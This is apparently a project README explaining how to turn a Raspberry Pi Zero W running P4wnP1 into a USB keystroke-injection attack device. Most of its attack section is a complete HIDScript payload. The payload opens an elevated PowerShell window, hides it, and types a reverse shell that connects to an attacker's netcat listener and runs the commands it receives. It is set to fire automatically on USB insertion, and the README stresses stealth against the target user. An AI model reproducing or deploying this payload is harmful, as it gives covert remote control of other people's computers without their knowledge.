# advanced HID attack device using Raspberry Pi Zero W
![image](https://github.com/ErroujiOussama/Keylogger-with-the-Raspberry-Pi-Zero-W/assets/107694414/a9310674-e5e9-41e0-9cf5-3c75b564e86b)
![image](https://github.com/ErroujiOussama/Keylogger-with-the-Raspberry-Pi-Zero-W/assets/107694414/c78eb71f-efe9-4f49-901c-6d911a84a279)
![image](https://github.com/ErroujiOussama/Keylogger-with-the-Raspberry-Pi-Zero-W/assets/107694414/b14fc106-b1b4-4658-b686-a75b67d7e09f)

## Overview

This project leverages the P4wnP1 A.L.O.A. framework to create an advanced HID (Human Interface Device) attack device using a Raspberry Pi Zero W. Inspired by various HID attack tools such as Rubber Ducky, Bash Bunny from Hak5, and O.MG cables, this device is capable of performing sophisticated attacks with customizable payloads.

## Hardware and Software Requirements

- **Hardware:**
  - Raspberry Pi Zero W
  - USB dongle expansion (e.g., MakerFun USB Expansion Dongle)
  - Sandisk Ultra SDHC card (16 GB recommended)

- **Software:**
  - P4wnP1 A.L.O.A. framework image (Beta version by MaMe82)
  - Balena Etcher (for writing the image to the SD card)

## Installation and Configuration

### Step 1: Writing the Image to the SD Card
1. Download the P4wnP1 image.
2. Use Balena Etcher to write the image to the SD card.

### Step 2: Initial Setup
1. Assemble the Raspberry Pi with the USB expansion dongle.
2. Insert the SD card into the Raspberry Pi and power it on.
3. Connect to the new Wireless Network named `P4wnP1`.
4. Use the default PSK: `MaMe82-P4wnP1`.

### Step 3: Configuration
1. **Web Interface:**
   - Access the configuration dashboard at `http://172.24.0.1:8000/`.
   - Change the Wireless settings (SSID, password) and hide the network.
   - Press `Deploy` to apply changes and `Store` to save settings (e.g., name the configuration `wifi_settings`).

2. **SSH:**
   - Connect via SSH: `ssh root@172.24.0.1` (password: `toor`).
   - Change the default root password using the `passwd` command.
   - Add keymap input if necessary by placing your keymap file in `/usr/local/P4wnP1/keymaps`.

## Creating a Basic Attack Script

### Step 1: Define a Reverse Shell Payload
```javascript
var locale = "pt"; // Define the keymap
var ip = "192.168.1.13"; // Netcat listener IP Address
var port = 9999; // Netcat listener Port

function hide() {
    type("$t = '[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);");
    press("ENTER");
}

function popshell(ip, port) {
    type("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\n");
    type("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;");
    type("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);");
    type("$sendback = (iex $data 2>&1 | Out-String );");
    type("$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';");
    type("$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);");
    type("$stream.Write($sendbyte,0,$sendbyte.Length);");
    type("$stream.Flush()};");
    type("$client.Close();");
    press("ENTER");
}

// Main script
layout(locale);
typingSpeed(0,0);
press("GUI x");
delay(2000);
press("SHIFT a");
delay(2000)
press("ALT y");
delay(3000);
hide();
delay(2000);
popshell(ip,port);
```

### Step 2: Save and Deploy the Script
1. Copy the script into the Hidscript editor in the P4wnP1 dashboard.
2. Save the script as `reverseshell`.
3. Create a Trigger Action to run the script upon USB connection.
4. Store the configuration as `usb shell`.

### Step 3: Define Master Template
1. Go to the Generic Settings tab.
2. Create a new Master Template combining the Trigger Action (`usb shell`), default USB, Bluetooth, Networks template, and the new Wifi template (`wifi_settings`).
3. Save the template as `custom_master` and set it as the Startup Template.

## Execution
1. Remove the device from the machine and set up a netcat listener on your machine:
   ```bash
   nc -lvp 9999
   ```
2. Insert the HID attack device into the target machine.
3. A remote shell should appear on your terminal.

## Considerations
- Adjust delays in the script based on the target machine's speed.
- Ensure the script runs stealthily to avoid user detection.

## References
- [P4wnP1 A.L.O.A. Documentation](https://github.com/mame82/P4wnP1_aloa)
- [Balena Etcher](https://www.balena.io/etcher/)
